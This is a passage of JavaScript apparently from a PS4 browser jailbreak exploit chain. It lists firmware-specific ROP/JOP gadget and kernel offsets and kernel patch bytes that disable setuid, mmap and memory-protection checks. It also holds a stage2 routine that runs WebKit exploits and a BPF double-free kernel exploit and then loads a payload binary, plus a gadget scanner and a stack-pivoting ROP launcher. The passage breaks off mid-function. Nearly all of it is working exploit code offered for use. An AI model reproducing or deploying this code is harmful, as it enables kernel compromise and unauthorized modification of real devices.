} else if (fwFromUA == "5.01") {
	gadgetcache = {
		"ret":                    0x0000003C, // 4.55-5.05
		"jmp rax":                0x00000082, // 4.55-5.05
		"ep":                     0x000000AD, // 4.55-5.05
		"pop rbp":                0x000000B6, // 4.55-5.05
		"mov [rdi], rax":         0x0014536B, // 5.01
		"pop r8":                 0x000179C5, // 5.01-5.05
		"pop rax":                0x000043F5, // 5.01-5.05
		"mov rax, rdi":           0x000058D0, // 5.01-5.05
		"mov rax, [rax]":         0x0006C83A, // 5.01-5.05
		"pop rsi":                0x0008F38A, // 5.01-5.05
		"pop rdi":                0x00038DBA, // 5.01-5.05
		"pop rcx":                0x00052E59, // 5.01-5.05
		"pop rsp":                0x0001E687, // 5.01-5.05
		"mov [rdi], rsi":         0x00023AC2, // 5.01-5.05
		"pop rdx":                0x000DEDC2, // 5.01
		"pop r9":                 0x00BB30CF, // 5.01
		"jop":                    0x000C37D0, // 5.01-5.05
		"infloop":                0x0151EFCA, // 5.01

		// kROP gadgets
		"mov [rdx], rax":         0x001F149B, // ?5.01?-5.05
		"add rax, rcx":           0x000156DB, // 5.01-5.05
		"mov rdx, rax":           0x00353A71, // 5.01
		"mov rax, rdx":           0x001CEE60, // 5.01
		"jmp rdx":                0x0000E3D0, // 5.05
		
		// BPF double free kexploit
		"ret2userland":           0x0005CDB9, // 5.01-5.05
		"add rsp, 0x28":          0x00004C2E, // ?5.01?-5.05
		"mov rax, [rdi]":         0x00046EF9, // 5.01-5.05
		"mov [rsi], rdx":         0x00A6450A, // ?5.01?-5.05
		"add rdi, rax; mov rax, rdi":0x0055566F, // 5.01
		
		// JOP gadgets for BPF double free kexploit
		"jop1":                   0x012A184D, // 5.01
		"jop2":                   0x006EF2E5, // 5.01
		"jop3":                   0x015CA29B, // 5.01
		"jop4":                   0x012846B4, // 5.01
		"jop_mov rbp, rsp":       0x000F094A, // 5.01-5.05
		"jop6":                   0x002728A1, // 5.01
		
		"longjmp":                0x000014E8, // 5.01-5.05
		"createThread":           0x00779190, // 5.01
	};
	gadgetshiftcache = {
		"stackshift_jop1":        0x00000058, // 5.01-5.05
		"stackshift_jop6":        0x00000028, // 4.05-5.05
		"jump_shift_jop1":        0x000007D0, // 4.55-5.05
		"jump_shift_jop5":        0x00000420, // 4.55-5.05
		"jump_shift_jop6":        0x00000040, // 4.55-5.05
	};
} else if (fwFromUA == "5.05") {
	gadgetcache = {
		"ret":                    0x0000003C, // 4.55-5.05
		"jmp rax":                0x00000082, // 4.55-5.05
		"ep":                     0x000000AD, // 4.55-5.05
		"pop rbp":                0x000000B6, // 4.55-5.05
		"mov [rdi], rax":         0x003ADAEB, // 5.05
		"pop r8":                 0x000179C5, // 5.01-5.05
		"pop rax":                0x000043F5, // 5.01-5.05
		"mov rax, rdi":           0x000058D0, // 5.01-5.05
		"mov rax, [rax]":         0x0006C83A, // 5.01-5.05
		"pop rsi":                0x0008F38A, // 5.01-5.05
		"pop rdi":                0x00038DBA, // 5.01-5.05
		"pop rcx":                0x00052E59, // 5.01-5.05
		"pop rsp":                0x0001E687, // 5.01-5.05
		"mov [rdi], rsi":         0x00023AC2, // 5.01-5.05
		"pop rdx":                0x001BE024, // 5.05
		"pop r9":                 0x00BB320F, // 5.05
		"jop":                    0x000C37D0, // 5.01-5.05
		"infloop":                0x01545EAA, // 5.05

		// kROP gadgets
		"mov [rdx], rax":         0x001F149B, // 5.05
		"add rax, rcx":           0x000156DB, // 5.01-5.05
		"mov rdx, rax":           0x00353B31, // 5.05
		"mov rax, rdx":           0x001CEF20, // 5.05
		"jmp rdx":                0x0000E3D0, // 5.05
		
		// BPF double free kexploit
		"ret2userland":           0x0005CDB9, // 5.01-5.05
		"add rsp, 0x28":          0x00004C2E, // ?5.01?-5.05
		"mov rax, [rdi]":         0x00046EF9, // 5.01-5.05
		"mov [rsi], rdx":         0x00A6450A, // 5.05
		"add rdi, rax; mov rax, rdi":0x005557DF, // 5.05
		
		// BPF double free JOP kdumper
		"mov rsi, rax; jmp rcx":  0x0000DEE0, // 5.05
		
		// JOP gadgets for BPF double free kexploit
		"jop1":                   0x012A19CD, // 5.05
		"jop2":                   0x006EF4E5, // 5.05
		"jop3":                   0x015CA41B, // 5.05
		"jop4":                   0x01284834, // 5.05
		"jop_mov rbp, rsp":       0x000F094A, // 5.01-5.05
		"jop6":                   0x00272961, // 5.05
		
		"longjmp":                0x000014E8, // 5.01-5.05
		"createThread":           0x00779390, // 5.05
	};
	gadgetshiftcache = {
		"stackshift_jop1":        0x00000058, // 5.01-5.05
		"stackshift_jop6":        0x00000028, // 4.05-5.05
		"jump_shift_jop1":        0x000007D0, // 4.55-5.05
		"jump_shift_jop5":        0x00000420, // 4.55-5.05
		"jump_shift_jop6":        0x00000040, // 4.55-5.05
	};
}
window.gadgets_shift = gadgetshiftcache;

if (fwFromUA == "3.55") {
	kernel_offsets = {
		"_vn_lock_break_slide":       0x00242CE6, // 3.55
		"__stack_chk_guard":          0x0242AD10, // 3.55
		"kqueue_close_slide":         0x0017BC22, // 3.55
		"bpf_slide":                  0x0024BDA3, // 3.55
		"jmp [rsi]":                  0x001EF468, // 3.55
		"cpu_setregs":                0x003A6E80, // 3.55
		"mov cr0, rax":               0x003A6E89, // 3.55
		"sys_setuid_patch_offset":    0x001A45C0, // 3.55
		"sys_mmap_patch_offset":      0x00349A97, // 3.55
		"vm_map_protect_patch_offset":0x003417B3, // 3.55
		"amd64_syscall_patch1_offset":0x000ED096, // 4.05
		"amd64_syscall_patch2_offset":0x003BBBEA, // 3.55
		"sys_dynlib_dlsym_patch1_offset":0x0014AADD, // 4.05
		"sys_dynlib_dlsym_patch2_offset":0x000E2DA0, // 4.05
		"syscall_11_patch1_offset":   0x00EEDA90, // 3.55
		"syscall_11_patch2_offset":   0x00EEDA98, // 3.55
		"syscall_11_patch3_offset":   0x00EEDAB8, // 3.55
	};
	kernel_patches = {
		// E8 8B EE 15 00 89 C3 85 -> B8 00 00 00 00 89 C3 85
		"sys_setuid_patch_1":         0x000000B8, // 3.55-5.05
		"sys_setuid_patch_2":         0x85C38900, // 3.55-4.05
		"sys_mmap_patch_1":           0x37B54137, // 3.55
		"sys_mmap_patch_2":           0x3145C031, // 3.55-5.05
		"vm_map_protect_patch_1":     0x9090CA39, // 3.55
		"vm_map_protect_patch_2":     0x90909090, // 3.55-5.05
		"amd64_syscall_patch1_1":     0x00000000, // 4.05-5.05
		"amd64_syscall_patch1_2":     0xF8858B48, // 4.05
		"amd64_syscall_patch2_1":     0x00000FE9, // 3.55
		"amd64_syscall_patch2_2":     0x528B4800, // 3.55
		"sys_dynlib_dlsym_patch1_1":  0x000000E9, // 4.05
		"sys_dynlib_dlsym_patch1_2":  0x8B489000, // 4.05-5.05
		"sys_dynlib_dlsym_patch2_1":  0x90C3C031, // 4.05-5.05
		"sys_dynlib_dlsym_patch2_2":  0x90909090, // 4.05-5.05
	};
} else if (fwFromUA == "4.05") {
	kernel_offsets = {
		"_vn_lock_break_slide":       0x00109E96, // 4.05
		"__stack_chk_guard":          0x024600D0, // 4.05
		"kqueue_close_slide":         0x00233A60, // 4.05
		"bpf_slide":                  0x00317809, // 4.05
		"jmp [rsi]":                  0x0075373F, // 4.05
		"cpu_setregs":                0x00389330, // 4.05
		"mov cr0, rax":               0x00389339, // 4.05
		"sys_setuid_patch_offset":    0x00085BB0, // 4.05
		"sys_mmap_patch_offset":      0x0031CFDC, // 4.05
		"vm_map_protect_patch_offset":0x004423E7, // 4.05
		"amd64_syscall_patch1_offset":0x000ED096, // 4.05
		"amd64_syscall_patch2_offset":0x000ED0BB, // 4.05
		"sys_dynlib_dlsym_patch1_offset":0x0014AADD, // 4.05
		"sys_dynlib_dlsym_patch2_offset":0x000E2DA0, // 4.05
		"syscall_11_patch1_offset":   0x00F179A0, // 4.05
		"syscall_11_patch2_offset":   0x00F179A8, // 4.05
		"syscall_11_patch3_offset":   0x00F179C8, // 4.05
	};
	kernel_patches = {
		// E8 8B EE 15 00 89 C3 85 -> B8 00 00 00 00 89 C3 85
		"sys_setuid_patch_1":         0x000000B8, // 4.05-5.05
		"sys_setuid_patch_2":         0x85C38900, // 3.55-4.05
		"sys_mmap_patch_1":           0x37B74137, // 4.05
		"sys_mmap_patch_2":           0x3145C031, // 4.05-5.05
		"vm_map_protect_patch_1":     0x9090C239, // 4.05
		"vm_map_protect_patch_2":     0x90909090, // 4.05-5.05
		"amd64_syscall_patch1_1":     0x00000000, // 4.05-5.05
		"amd64_syscall_patch1_2":     0xF8858B48, // 4.05
		"amd64_syscall_patch2_1":     0x00007DE9, // 4.05
		"amd64_syscall_patch2_2":     0x72909000, // 4.05
		"sys_dynlib_dlsym_patch1_1":  0x000000E9, // 4.05
		"sys_dynlib_dlsym_patch1_2":  0x8B489000, // 4.05-5.05
		"sys_dynlib_dlsym_patch2_1":  0x90C3C031, // 4.05-5.05
		"sys_dynlib_dlsym_patch2_2":  0x90909090, // 4.05-5.05
	};
} else if (fwFromUA == "4.55") {
	kernel_offsets = {
		"__stack_chk_guard":          0x02610AD0, // 4.55
		"jmp [rsi]":                  0x0013A39F, // 4.55
		"kqueue_close_slide":         0x001E2640, // 4.55
		"cpu_setregs":                0x00280F70, // 4.55
		"mov cr0, rax":               0x00280F79, // 4.55
		"sys_setuid_patch_offset":    0x001144E3, // 4.55
		"sys_mmap_patch_offset":      0x00141D14, // 4.55
		"vm_map_protect_patch_offset":0x00396A56, // 4.55
		"amd64_syscall_patch1_offset":0x003DC603, // 4.55
		"amd64_syscall_patch2_offset":0x003DC621, // 4.55
		"sys_dynlib_dlsym_patch1_offset":0x003CF6FE, // 4.55
		"sys_dynlib_dlsym_patch2_offset":0x000690C0, // 4.55
		"syscall_11_patch1_offset":   0x0102B8A0, // 4.55
		"syscall_11_patch2_offset":   0x0102B8A8, // 4.55
		"syscall_11_patch3_offset":   0x0102B8C8, // 4.55
	};
	kernel_patches = {
		// E8 C8 37 13 00 41 89 C6 -> B8 00 00 00 00 41 89 C6
		"sys_setuid_patch_1":         0x000000B8, // 4.05-5.05
		"sys_setuid_patch_2":         0xC6894100, // 4.55-4.74
		"sys_mmap_patch_1":           0x37B64137, // 4.55-4.74
		"sys_mmap_patch_2":           0x3145C031, // 4.05-5.05
		"vm_map_protect_patch_1":     0x9090EA38, // 4.55-4.74
		"vm_map_protect_patch_2":     0x90909090, // 4.05-5.05
		"amd64_syscall_patch1_1":     0x00000000, // 4.05-5.05
		"amd64_syscall_patch1_2":     0x40878B49, // 4.55-5.05
		"amd64_syscall_patch2_1":     0x909079EB, // 4.55-4.74
		"amd64_syscall_patch2_2":     0x72909090, // 4.55-5.05
		"sys_dynlib_dlsym_patch1_1":  0x000352E9, // 4.05-4.74
		"sys_dynlib_dlsym_patch1_2":  0x8B489000, // 4.05-5.05
		"sys_dynlib_dlsym_patch2_1":  0x90C3C031, // 4.05-5.05
		"sys_dynlib_dlsym_patch2_2":  0x90909090, // 4.05-5.05
	};
} else if (fwFromUA == "4.74") {
	kernel_offsets = {
		"jmp [rsi]":                  0x00139A2F, // 4.74
		"kqueue_close_slide":         0x001E48A0, // 4.74
		"cpu_setregs":                0x00283120, // 4.74
		"mov cr0, rax":               0x00283129, // 4.74
		"sys_setuid_patch_offset":    0x00113B73, // 4.74
		"sys_mmap_patch_offset":      0x001413A4, // 4.74
		"vm_map_protect_patch_offset":0x00397876, // 4.74
		"amd64_syscall_patch1_offset":0x003DD4B3, // 4.74
		"amd64_syscall_patch2_offset":0x003DD4D1, // 4.74
		"sys_dynlib_dlsym_patch1_offset":0x003D05AE, // 4.74
		"sys_dynlib_dlsym_patch2_offset":0x000686A0, // 4.74
		"syscall_11_patch1_offset":   0x010349A0, // 4.74
		"syscall_11_patch2_offset":   0x010349A8, // 4.74
		"syscall_11_patch3_offset":   0x010349C8, // 4.74
	};
	kernel_patches = {
		// E8 C8 37 13 00 41 89 C6 -> B8 00 00 00 00 41 89 C6
		"sys_setuid_patch_1":         0x000000B8, // 4.05-5.05
		"sys_setuid_patch_2":         0xC6894100, // 4.55-4.74
		"sys_mmap_patch_1":           0x37B64137, // 4.55-4.74
		"sys_mmap_patch_2":           0x3145C031, // 4.05-5.05
		"vm_map_protect_patch_1":     0x9090EA38, // 4.55-4.74
		"vm_map_protect_patch_2":     0x90909090, // 4.05-5.05
		"amd64_syscall_patch1_1":     0x00000000, // 4.05-5.05
		"amd64_syscall_patch1_2":     0x40878B49, // 4.55-5.05
		"amd64_syscall_patch2_1":     0x909079EB, // 4.55-4.74
		"amd64_syscall_patch2_2":     0x72909090, // 4.55-5.05
		"sys_dynlib_dlsym_patch1_1":  0x000352E9, // 4.05-4.74
		"sys_dynlib_dlsym_patch1_2":  0x8B489000, // 4.05-5.05
		"sys_dynlib_dlsym_patch2_1":  0x90C3C031, // 4.05-5.05
		"sys_dynlib_dlsym_patch2_2":  0x90909090, // 4.05-5.05
	};
} else if (fwFromUA == "5.01") {
	kernel_offsets = {
		"jmp [rsi]":                  0x00139A2F, // 4.74
		"kqueue_close_slide":         0x0016D762, // 5.01
	};
} else if (fwFromUA == "5.05") {
	if (devkit == true)
    {
	    kernel_offsets = {
		    "jmp [rsi]":                  0x00019FD0, // 5.05d
            "kqueue_close_slide":         0x001D76E2, // 5.05d
            "cpu_setregs":                0x002C5660, // 5.05d
            "mov cr0, rax":               0x002C5669, // 5.05d
            "sys_setuid_patch_offset":    0x00068B32, // 5.05d
            "sys_mmap_patch_offset":      0x00197BC0, // 5.05d
            "vm_map_protect_patch_offset":0x00217AA6, // 5.05d
            "amd64_syscall_patch1_offset":0x000004B5, // 5.05d
            "amd64_syscall_patch2_offset":0x000004D3, // 5.05d
            "sys_dynlib_dlsym_patch1_offset":0x002CA93A, // 5.05d
            "sys_dynlib_dlsym_patch2_offset":0x00360BD0, // 5.05d

            //"syscall_11_patch1_offset":   0x012AFD20, // 5.05d
            //"syscall_11_patch2_offset":   0x012AFD28, // 5.05d
            //"syscall_11_patch3_offset":   0x012AFD48, // 5.05d

            "syscall_11_patch1_offset":   0x012AFDB0, // 5.05d
            "syscall_11_patch2_offset":   0x012AFDB8, // 5.05d
            "syscall_11_patch3_offset":   0x012AFDD8, // 5.05d

            //"syscall_11_2_patch1_offset":   0x01AAFDB0, // 5.05d
            //"syscall_11_2_patch2_offset":   0x01AAFDB8, // 5.05d
            //"syscall_11_2_patch3_offset":   0x01AAFDD8, // 5.05d

            "syscall_11_2_patch1_offset":   0x01AAFE40, // 5.05d
            "syscall_11_2_patch2_offset":   0x01AAFE48, // 5.05d
            "syscall_11_2_patch3_offset":   0x01AAFE68, // 5.05d
	    };
    }
    else
    {
	    kernel_offsets = {
		    "jmp [rsi]":                  0x00093385, // 5.05
		    "kqueue_close_slide":         0x0016D872, // 5.05
		    "cpu_setregs":                0x00233020, // 5.05
		    "mov cr0, rax":               0x00233029, // 5.05
		    "sys_setuid_patch_offset":    0x00054A72, // 5.05
		    "sys_mmap_patch_offset":      0x0013D620, // 5.05
		    "vm_map_protect_patch_offset":0x001A3C06, // 5.05
		    "amd64_syscall_patch1_offset":0x00000493, // 5.05
		    "amd64_syscall_patch2_offset":0x000004B1, // 5.05
		    "sys_dynlib_dlsym_patch1_offset":0x00237F3A, // 5.05
		    "sys_dynlib_dlsym_patch2_offset":0x002B2620, // 5.05
		    "syscall_11_patch1_offset":   0x0107C820, // 5.05
		    "syscall_11_patch2_offset":   0x0107C828, // 5.05
		    "syscall_11_patch3_offset":   0x0107C848, // 5.05
	    };
    }

	kernel_patches = {
		// E8 C8 37 13 00 41 89 C6 -> B8 00 00 00 00 41 89 C4
		"sys_setuid_patch_1":         0x000000B8, // 4.05-5.05
		"sys_setuid_patch_2":         0xC4894100, // 5.05
		"sys_mmap_patch_1":           0x37B64037, // 5.05
		"sys_mmap_patch_2":           0x3145C031, // 4.05-5.05
		"vm_map_protect_patch_1":     0x9090FA38, // 5.05
		"vm_map_protect_patch_2":     0x90909090, // 4.05-5.05
		"amd64_syscall_patch1_1":     0x00000000, // 4.05-5.05
		"amd64_syscall_patch1_2":     0x40878B49, // 4.55-5.05
		"amd64_syscall_patch2_1":     0x90907DEB, // 5.05
		"amd64_syscall_patch2_2":     0x72909090, // 4.55-5.05
		"sys_dynlib_dlsym_patch1_1":  0x0001C1E9, // 5.05
		"sys_dynlib_dlsym_patch1_2":  0x8B489000, // 4.05-5.05
		"sys_dynlib_dlsym_patch2_1":  0x90C3C031, // 4.05-5.05
		"sys_dynlib_dlsym_patch2_2":  0x90909090, // 4.05-5.05
	};
}
window.kernel_offsets = kernel_offsets;
window.kernel_patches = kernel_patches;

async function stage2_() {
    try {
        p = window.prim;

        console.log("%c[Stage 2] Setting up userland primitives...", "color:orange");

        // WebKit Exploit with Retry
        if (typeof exploit_setAttributeNodeNS === "function") {
            await runWithRetry(exploit_setAttributeNodeNS, 5, 700);
        } else {
            await runWithRetry(exploit_haveABadTime, 5, 700);
        }

        if (!window.prim) throw new Error("No primitive after WebKit exploit");

        // Primitive Self-Test
        const testArr = new Uint32Array([0x13371337]);
        const testAddr = p.leakval(testArr);
        if (testAddr.low === 0 && testAddr.hi === 0) 
            throw new Error("Primitive self-test failed");

        console.log("%cUserland primitives initialized successfully", "color:lime");

        forceGC(12);

        // Kernel Exploit
        let kernelSuccess = false;
        if (p.syscall("sys_setuid", 0).low !== 0) {
            console.log("%cKernel not patched. Launching improved BPF double-free...", "color:yellow");
            kernelSuccess = await runWithRetry(kernExploit_bpf_double_free_improved, 6, 1300);
        } else {
            console.log("%cKernel already patched!", "color:lime");
            kernelSuccess = true;
        }

        if (!kernelSuccess) throw new Error("Kernel exploit failed");

        // Final Payload
        if (bin_loader) {
            // Your bin loader code here...
            console.log("%cBin loader activated", "color:cyan");
        } else {
            runPayload("ps4-devkit-activator-5.05.bin");
            console.log("%cDevkit activation complete!", "color:lime;font-weight:bold");
        }

    } catch (e) {
        console.error("Stage 2 failed:", e);
        alert("Exploit failed. Refresh and try again.");
    }
}

function stage2_old () {
	p = window.prim;
	//alert("stage2");
	
	var slide = 0;
	if (window.ps4_fw <= 407)
		slide = 0x20;
	else
		slide = 0x40;
	p.leakfunc = function (func) {
		var fptr_store = p.leakval(func);
		return (p.read8(fptr_store.add32(0x18))).add32(slide);
	}

	var parseFloatStore = p.leakfunc(parseFloat);
	var parseFloatPtr = p.read8(parseFloatStore);
	// alert(parseFloatPtr);
	
	// Resolve libSceWebKit2 base using parseFloat offset
	var webKitBase = parseFloatPtr;
	if (fwFromUA == "3.55") {
		webKitBase.sub32inplace(0x55EA0);
	} else if (fwFromUA == "4.05") {
		webKitBase.sub32inplace(0x55FB0);
	} else if (fwFromUA == "4.55" || fwFromUA == "4.74") {
		webKitBase.sub32inplace(0xE8DDA0);
	} else if (fwFromUA == "5.00" || fwFromUA == "5.01") {
		webKitBase.sub32inplace(0x5783D0);
	} else if (fwFromUA == "5.03" || fwFromUA == "5.05" || fwFromUA == "5.07") {
		webKitBase.sub32inplace(0x578540);
	} else window.log("unknown parseFloat offset: " + parseFloatPtr, "red");
	window.webKitBase = webKitBase;
	//alert(window.webKitBase);
	var o2wk = function (o) {
		return webKitBase.add32(o);
	}
	window.o2wk = o2wk;
	
	if (fwFromUA == "3.55") {
		gadgets_temp = {
			"__stack_chk_fail": o2wk(0xE8),
			"__stack_chk_fail_offset": 0xD790,
			"memset": o2wk(0x138),
			"memset_offset": 0x92D10,
		};
	} else if (fwFromUA == "4.05") {
		gadgets_temp = {
			"__stack_chk_fail": o2wk(0xF0),
			"__stack_chk_fail_offset": 0xD0D0,
			"memset": o2wk(0x140),
			"memset_offset": 0x37080,
		};
	} else if (fwFromUA == "4.55") {
		gadgets_temp = {
			"__stack_chk_fail": o2wk(0xC8),
			"__stack_chk_fail_offset": 0xD190,
			"memset": o2wk(0x248),
			"memset_offset": 0x2AE10,
		};
	} else if (fwFromUA == "4.74") {
		gadgets_temp = {
			"__stack_chk_fail": o2wk(0xC8),
			"__stack_chk_fail_offset": 0xD190,
			"memset": o2wk(0x248),
			"memset_offset": 0x2AE10,
		};
	} else if (fwFromUA == "5.00" || fwFromUA == "5.01" || fwFromUA == "5.03" || fwFromUA == "5.05" || fwFromUA == "5.07") {
		gadgets_temp = {
			"__stack_chk_fail": o2wk(0xC8),
			"__stack_chk_fail_offset": 0x11EC0,
			"memset": o2wk(0x228),
			"memset_offset": 0x225E0,
		};
	}
	
	var libSceLibcInternalBase = p.read8(get_jmptgt(gadgets_temp.memset));
	libSceLibcInternalBase.sub32inplace(gadgets_temp.memset_offset);
	window.libSceLibcInternalBase = libSceLibcInternalBase;
	//alert(libSceLibcInternalBase);
	var o2lc = function (o) {
		return libSceLibcInternalBase.add32(o);
	}
	window.o2lc = o2lc;
	
	var libKernelBase = p.read8(get_jmptgt(gadgets_temp.__stack_chk_fail));
	libKernelBase.sub32inplace(gadgets_temp.__stack_chk_fail_offset);
	window.libKernelBase = libKernelBase;
	//alert(window.libKernelBase);
	var o2lk = function (o) {
		return libKernelBase.add32(o);
	}
	window.o2lk = o2lk;
	
	
	if (fwFromUA == "3.55") {
		gadgets = {
			"__stack_chk_fail": o2wk(0xE8),
			"__stack_chk_fail_offset": 0xD790,
			"memcpy": o2wk(0x128),
			"memset": o2wk(0x138),
			"memset_offset": 0x37080,
			"setjmp": o2wk(0x2B8),
			"scePthreadCreate": o2lk(0x11E80),
			"mov rdi, [rdi+0x48]": o2lc(0x8E982), // 3.55 - 48 8B 7F 48 C3
			"sub rax, rcx": o2lk(0x1773B),
			"add rax, [rdi]": o2lc(0x40B58), // 3.55 - 48 03 07 C3
		};
	} else if (fwFromUA == "4.05") {
		gadgets = {
			"__stack_chk_fail": o2wk(0xF0),
			"__stack_chk_fail_offset": 0xD0D0,
			"memcpy": o2wk(0x130),
			"memset": o2wk(0x140),
			"memset_offset": 0x37080,
			"setjmp": o2wk(0x270),
			"scePthreadCreate": o2lk(0x11570),
			"mov rdi, [rdi+0x48]": o2lc(0xA8282), // 4.05 - 48 8B 7F 48 C3
			"sub rax, rcx": o2lk(0x1702B),
			"add rax, [rdi]": o2lc(0x58978), // 4.05 - 48 03 07 C3
		};
	} else if (fwFromUA == "4.55") {
		gadgets = {
			"__stack_chk_fail": o2wk(0xC8),
			"__stack_chk_fail_offset": 0xD190,
			"memcpy": o2wk(0xF8),
			"memset": o2wk(0x248),
			"memset_offset": 0x2AE10,
			"setjmp": o2wk(0x1468),
			"scePthreadCreate": o2lk(0x115C0),
			"mov rdi, [rdi+0x48]": o2lc(0xA1262), // 4.55-4.74 - 48 8B 7F 48 C3
			"sub rax, rcx": o2lk(0x1760B),
			"add rax, [rdi]": o2lc(0x4C418), // 4.55-4.74 - 48 03 07 C3
		};
	} else if (fwFromUA == "4.74") {
		gadgets = {
			"__stack_chk_fail": o2wk(0xC8),
			"__stack_chk_fail_offset": 0xD190,
			"memcpy": o2wk(0xF8),
			"memset": o2wk(0x248),
			"memset_offset": 0x2AE10,
			"setjmp": o2wk(0x1468),
			"scePthreadCreate": o2lk(0x115C0),
			"mov rdi, [rdi+0x48]": o2lc(0xA1262), // 4.55-4.74 - 48 8B 7F 48 C3
			"sub rax, rcx": o2lk(0x1789B),
			"add rax, [rdi]": o2lc(0x4C418), // 4.55-4.74 - 48 03 07 C3
		};
	} else if (fwFromUA == "5.00" || fwFromUA == "5.01" || fwFromUA == "5.03" || fwFromUA == "5.05" || fwFromUA == "5.07") {
		gadgets = {
			"__stack_chk_fail": o2wk(0xC8),
			"__stack_chk_fail_offset": 0x11EC0,
			"memcpy": o2wk(0xF8),
			"memset": o2wk(0x228),
			"memset_offset": 0x225E0,
			"setjmp": o2wk(0x14F8),
			"scePthreadCreate": o2lk(0x98C0),
			"mov rdi, [rdi+0x48]": o2lc(0xB00F2), // 5.05 - 48 8B 7F 48 C3
			"sub rax, rcx": o2lk(0x1EADB), // 5.05 - 48 29 C8 C3
			"add rax, [rdi]": o2lc(0x44DB8), // 5.05 - 48 03 07 C3
		};
	}
	
	
	var wkview = new Uint8Array(0x1000);
	var wkstr = p.leakval(wkview).add32(window.leakval_slide);
	var orig_wkview_buf = p.read8(wkstr);

	p.write8(wkstr, webKitBase);
	//p.write4(wkstr.add32(8), 0x367c000);
	p.write4(wkstr.add32(8), 0x3052D38);

	var gadgets_to_find = 0;
	var gadgetnames = [];
	for (var gadgetname in gadgetmap_wk) {
		if (gadgetmap_wk.hasOwnProperty(gadgetname)) {
			gadgets_to_find++;
			gadgetnames.push(gadgetname);
			gadgetmap_wk[gadgetname].reverse();
		}
	}

	gadgets_to_find++;

	var findgadget = function (donecb) {
		if (gadgetcache) {
			gadgets_to_find = 0;
			slowpath_jop = 0;
			for (var gadgetname in gadgetcache) {
				if (gadgetcache.hasOwnProperty(gadgetname))
					gadgets[gadgetname] = o2wk(gadgetcache[gadgetname]);
			}
		} else {
			for (var i = 0; i < wkview.length; i++) {
				if (wkview[i] == 0xc3) {
					for (var nl = 0; nl < gadgetnames.length; nl++) {
						var found = 1;
						if (!gadgetnames[nl])
							continue;
						var gadgetbytes = gadgetmap_wk[gadgetnames[nl]];
						for (var compareidx = 0; compareidx < gadgetbytes.length; compareidx++) {
							if (gadgetbytes[compareidx] != wkview[i - compareidx]) {
								found = 0;
								break;
							}
						}
						if (!found)
							continue;
						gadgets[gadgetnames[nl]] = o2wk(i - gadgetbytes.length + 1);
						gadgetoffs[gadgetnames[nl]] = i - gadgetbytes.length + 1;
						delete gadgetnames[nl];
						gadgets_to_find--;
					}
				} else if (wkview[i] == 0xe0 && wkview[i - 1] == 0xff && slowpath_jop) {
					var found = 1;
					for (var compareidx = 0; compareidx < slowpath_jop.length; compareidx++) {
						if (slowpath_jop[compareidx] != wkview[i - compareidx]) {
							found = 0;
							break;
						}
					}
					if (!found)
						continue;
					gadgets["jop"] = o2wk(i - slowpath_jop.length + 1);
					gadgetoffs["jop"] = i - slowpath_jop.length + 1;
					gadgets_to_find--;
					slowpath_jop = 0;
				}
				if (!gadgets_to_find)
					break;
			}
		}
		if (!gadgets_to_find && !slowpath_jop)
			setTimeout(donecb, 50);
		else {
			print("missing gadgets: ");
			for (var nl in gadgetnames)
				print(" - " + gadgetnames[nl]);
			if (slowpath_jop)
				print(" - jop gadget");
		}
	}
	//alert("find");
	findgadget(function () { });
	
	if (window.ps4_fw <= 407) {
		
      var funcPtrStore = p.leakfunc(parseFloat);
      var funcArgs = [];

      for (var i = 0; i < 0x7FFF; i++)
        funcArgs[i] = 0x41410000 | i;

      /* Ensure everything is aligned and the layout is intact */
      var argBuffer = new Uint32Array(0x1000);
      var argPointer = p.read8(p.leakval(argBuffer).add32(window.leakval_slide));
      argBuffer[0] = 0x13371337;

      if (p.read4(argPointer) != 0x13371337)
        throw new Error("Stack frame is not aligned!");

      window.dont_tread_on_me = [argBuffer];

      /* Load ROP chain into memory */
      var launch_chain = function (chain) {
        var stackPointer = 0;
        var stackCookie = 0;
        var orig_reenter_rip = 0;

        var reenter_help = {
          length: {
            valueOf: function() {
              orig_reenter_rip = p.read8(stackPointer);
			  stackCookie = p.read8(stackPointer.add32(8));
              var returnToFrame = stackPointer;

              var ocnt = chain.count;
              chain.push_write8(stackPointer, orig_reenter_rip);
              chain.push_write8(stackPointer.add32(8), stackCookie);

              if (chain.runtime)
				  returnToFrame = chain.runtime(stackPointer);

              chain.push(window.gadgets["pop rsp"]);
              chain.push(returnToFrame); // -> back to the trap life
              chain.count = ocnt;

              p.write8(stackPointer, window.gadgets["pop rsp"]);
              p.write8(stackPointer.add32(8), chain.stackBase);
            }
          }
        };

        return (function() {
          /* Clear stack frame */
          (function(){}).apply(null, funcArgs);

          /* Recover frame */
          var orig = p.read8(funcPtrStore);
          p.write8(funcPtrStore, window.gadgets["mov rax, rdi"]);

          /* Setup frame */
          var trap = p.leakval(parseFloat());
          var rtv = 0;
          var fakeval = new int64(0x41414141, 0xffff0000);

          (function() {
            var val = p.read8(trap.add32(0x100));
            if ((val.hi != 0xffff0000) || ((val.low & 0xFFFF0000) != 0x41410000))
              throw new Error("Stack frame corrupted!");
          }).apply(null, funcArgs);

          /* Write vtable, setjmp stub, and 'jmp rax' gadget */
          p.write8(argPointer, argPointer.add32(0x100));
          p.write8(argPointer.add32(0x130), window.gadgets["setjmp"]);
          p.write8(funcPtrStore, window.gadgets["jop"]);

          /* Clear and write to frame */
          (function(){}).apply(null, funcArgs);
          p.write8(trap.add32(0x18), argPointer);
          p.leakval(parseFloat()); // Jumps to "setjmp" function stub in libkernel

          /* Finish by resetting the stack's base pointer and canary */
          stackPointer = p.read8(argPointer.add32(0x10));

          rtv = Array.prototype.splice.apply(reenter_help);
          p.write8(trap.add32(0x18), fakeval);
          p.write8(trap.add32(0x18), orig);

          return p.leakval(rtv);
        }).apply(null, funcArgs);
      }
	} else {
		
		var hold1;
		var hold2;
		var holdz;
		var holdz1;

		while (1) {
			hold1 = { a: 0, b: 0, c: 0, d: 0 };
			hold2 = { a: 0, b: 0, c: 0, d: 0 };
			holdz1 = p.leakval(hold2);
			holdz = p.leakval(hold1);
			if (holdz.low - 0x30 == holdz1.low)
				break;
		}

		var pushframe = [];
		pushframe.length = 0x80;
		var rtv = 0;
		var funcbuf;
		var funcbuf32 = new Uint32Array(0x100);
		nogc.push(funcbuf32);

		var launch_chain = function (chain) {
			var stackPointer = 0;
			var stackCookie = 0;
			var orig_reenter_rip = 0;

			var reenter_help = {
				length: {
					valueOf: function () {
						orig_reenter_rip = p.read8(stackPointer);
						stackCookie = p.read8(stackPointer.add32(8));
						var returnToFrame = stackPointer;

						var ocnt = chain.count;
						chain.push_write8(stackPointer, orig_reenter_rip);
						chain.push_write8(stackPointer.add32(8), stackCookie);

						if (chain.runtime)
